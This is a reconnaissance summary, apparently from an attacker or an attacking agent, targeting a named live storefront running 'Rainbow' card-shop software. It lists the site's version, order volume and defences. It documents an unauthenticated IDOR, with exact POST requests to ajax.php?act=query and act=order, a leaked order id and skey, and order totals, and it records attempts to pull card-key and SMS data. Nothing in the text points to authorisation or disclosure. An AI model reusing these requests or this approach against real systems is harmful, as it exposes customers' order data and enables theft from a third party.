# qqq.lc recon summary

## Verdict

Rainbow **2.8.3 / build 1043** (`yxts=257`), ~**5.9万** orders / **~124.5万** money, root-path behind **Cloudflare + chenmYun CC**. Storefront HTML is login-gated; **SUCCESS_CASES none reusable**.

**New IDOR:** unauth `ajax.php?act=query` enumerates orders by exact `input` and leaks `skey`; `act=order` + `id/skey` returns detail. **Kami/SMS payload not obtained** (`list`/`kminfo` null in samples).

## SUCCESS_CASES

| Case | Result |
|------|--------|
| qd93 HTML substring | 302 login — N/A |
| 79yj/qq1234 api search | api.php 404 |
| YKFAKA null | N/A |

## Surface

- `/` → CC challenge → (cookie) **302 `/user/login.php`**
- `/shop/` 404; `api.php` / `%61pi.php` 404
- `ajax.php?act=getcount` works unauth
- Geetest `gt=0ea798b5bed2f1e44363199aadfc2773` (not shared cluster gt)
- Pay: `你还未登录`

## Query IDOR proof

```
POST /ajax.php?act=query
querytype=1&qq=1&page=1
→ total=5539, data.order_*.skey present

POST /ajax.php?act=order
id=20260803153417205366&skey=f492c148eb6db0fb8aece5bafc427edd
→ code=0 order detail (list/kminfo null)
```

Digit inputs `1`–`9` alone cover thousands of rows (province codes for 发码/接码 goods).

## Artifacts

- `FINDINGS.json`
- `results/SUCCESS_CASES_MIGRATE.md`
- `results/proof_query_qq1.json` / `proof_order_detail.json`
- `results/phoneish_inputs.json`
- `scripts/qqqlc_*.py` / `qqqlc_recon.sh`
